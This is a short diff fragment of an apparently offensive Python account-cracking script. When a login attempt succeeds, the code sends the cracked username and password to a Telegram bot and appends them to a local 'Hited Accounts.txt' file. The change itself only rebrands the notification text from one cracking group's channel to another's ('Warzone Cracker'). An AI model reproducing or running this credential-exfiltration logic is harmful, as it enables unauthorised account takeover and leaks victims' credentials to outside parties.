@@ -189,7 +189,7 @@ elif ask =="1":
         #print(r.text)
         if "logged_in_user" in r.text:
             if "Y" or "y" in tele:
-                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @Berlin_Tools")
+                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited By Warzone Cracker\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @kurdhacker_hama_bn_dlaj")
          
             open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
             h += 1
